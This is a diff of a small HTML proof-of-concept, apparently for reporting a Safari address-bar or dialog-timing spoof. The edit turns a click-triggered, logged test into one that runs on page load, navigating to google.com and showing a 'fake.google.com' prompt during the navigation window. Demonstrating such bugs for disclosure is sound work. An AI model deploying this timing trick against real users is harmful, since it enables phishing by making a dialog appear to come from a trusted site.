@@ -1,43 +1,28 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>Address Bar Spoof PoC</title>
+<meta charset="utf-8">
+<title>Safari Dialog Timing PoC</title>
 </head>
-<body style="font-family:sans-serif; text-align:center; background:#111; color:#fff;">
-<h2>Safe Address Bar Spoof PoC</h2>
-<button id="start" style="font-size:20px;padding:12px 24px;">Start Test</button>
-
-<pre id="log" style="text-align:left; margin:20px auto; width:90%; max-width:800px;
-background:#000; padding:16px; border-radius:8px; color:#0f0;"></pre>
+<body style="background:#000;color:#fff;font-family:sans-serif;text-align:center;">
+<h3>Loading…</h3>
 
 <script>
-const log = msg => {
-  document.getElementById("log").textContent += msg + "\n";
-  console.log("[PoC]", msg);
-};
+// delay kecil biar page settle
+setTimeout(() => {
 
-document.getElementById("start").onclick = () => {
-  log("[INFO] User clicked button");
+  // trigger top-level navigation
+  location.href = "https://google.com";
 
-  // Contoh URL encoding untuk “spoof”
-  const fakeUrl = "https://google.com";
-
-  log("[INFO] Navigating to: " + fakeUrl);
-
-  // open in new tab / window
-  window.open(fakeUrl, "_blank");
-
-  // optional: show prompt for demo
+  // dialog during navigation window
   setTimeout(() => {
-    try {
-      prompt("fake.google.com\n⚠️ Do not sign into your account", "");
-      log("[BUG] Prompt shown during URL trick ❌");
-    } catch(e) {
-      log("[OK] Prompt blocked ✔");
-    }
-  }, 800);
-};
+    prompt(
+      "fake.google.com\n⚠️ Do not sign into your account",
+      ""
+    );
+  }, 40);
+
+}, 300);
 </script>
 </body>
 </html>
